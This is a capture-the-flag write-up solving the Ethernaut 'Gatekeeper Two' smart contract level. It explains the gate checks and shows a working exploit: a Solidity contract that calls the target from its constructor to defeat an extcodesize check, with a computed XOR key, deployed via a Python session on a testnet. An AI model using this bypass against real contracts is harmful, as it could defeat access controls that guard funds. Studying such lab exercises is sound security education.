# 14 - Gatekeeper Two

## Challenge

This gatekeeper introduces a few new challenges. Register as an entrant to pass this level.

Things that might help:

- Remember what you've learned from getting past the first gatekeeper - the first gate is the same.
- The `assembly` keyword in the second gate allows a contract to access functionality that is not native to vanilla Solidity. See [here](http://solidity.readthedocs.io/en/v0.4.23/assembly.html) for more information. The `extcodesize` call in this gate will get the size of a contract's code at a given address - you can learn more about how and when this is set in section 7 of the [yellow paper](https://ethereum.github.io/yellowpaper/paper.pdf).
- The `^` character in the third gate is a bitwise operation (XOR), and is used here to apply another common bitwise operation (see [here](http://solidity.readthedocs.io/en/v0.4.23/miscellaneous.html#cheatsheet)). The Coin Flip level is also a good place to start when approaching this challenge.

```js
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract GatekeeperTwo {

  address public entrant;

  modifier gateOne() {
    require(msg.sender != tx.origin);
    _;
  }

  modifier gateTwo() {
    uint x;
    assembly { x := extcodesize(caller()) }
    require(x == 0);
    _;
  }

  modifier gateThree(bytes8 _gateKey) {
    require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == type(uint64).max);
    _;
  }

  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
    entrant = tx.origin;
    return true;
  }
}
```

## Summary

`gateOne()` is the same as last level. Nothing new.

`gateTwo()` checks if the caller has any code. `extcodesize` returns the size of the code at the address. It seems always non-zero, however here we need it to be 0. Challenge description mentions that we can reference section 7 of the [yellow paper](https://ethereum.github.io/yellowpaper/paper.pdf). Section 7 is "Contract Creation":

> 7.1. Subtleties. Note that while the initialisation code is executing, the newly created address exists but with no intrinsic body code[5]. Thus any message call received by it during this time causes no code to be executed.
>
> [5] During initialization code execution, `EXTCODESIZE` on the address should return zero, which is the length of the code of the account while `CODESIZE` should return the length of the initialization code.

As seen here, we can call `enter` inside the constructor of our intermediate hack contract. It will be executed during initialization, so `extcodesize` will return 0. We can then pass `gateTwo()`.

`gateThree()` has a long check: `uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == type(uint64).max`. `type(uint64).max` is obviously `2**64 - 1`. It is also important to notice `msg.sender` is essentially the deployed hack contract address, or `address(this)`.

So `_gateKey` actually equals to the xor of `uint64(bytes8(keccak256(abi.encodePacked(address(this)))))` and `0xffffffffffffffff`.

At this stage we understand all 3 gates and can solve the level easily.

## Walkthrough

```py
>>> from cheb3 import Connection
>>> from cheb3.utils import compile_sol
>>> conn = Connection("https://goerli.infura.io/v3/<key>")
>>> account = conn.account("<priv_key>")
>>> contract_addr = '"0xf32259ecF7d25D5b445238d739313ED1246727B4"'
```

Deploy contract:

```py
>>> abi, bytecode = compile_sol('''
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract GatekeeperTwoHack {
    bool public succeeded;

    constructor(address _gatekeeperTwoAddr) {
        bytes8 key = bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ 0xffffffffffffffff);
        (bool success, ) = address(_gatekeeperTwoAddr).call(abi.encodeWithSignature("enter(bytes8)", key));
        if (success) {
            succeeded = true;
        }
    }
}
''',
solc_version="0.8.17",
base_path="Ethernaut/node_modules/"
)['GatekeeperTwoHack']
>>>
>>> attackContract = conn.contract(account, abi=abi, bytecode=bytecode)
>>> attackContract.deploy(contract_addr)
2023-06-19 23:53:07.905 | DEBUG    | cheb3.contract:deploy:94 - Deploying contract ...
2023-06-19 23:53:17.054 | INFO     | cheb3.contract:deploy:99 - The contract is deployed at 0x2F8CE08Ce0150BF9e138e1b22C7E8f4dC7611D12
```

```py
>>> attackContract.functions.succeeded().call()
True
```

Now `await contract.entrant()` shows my own wallet address. Finally, submit the instance to pass the level.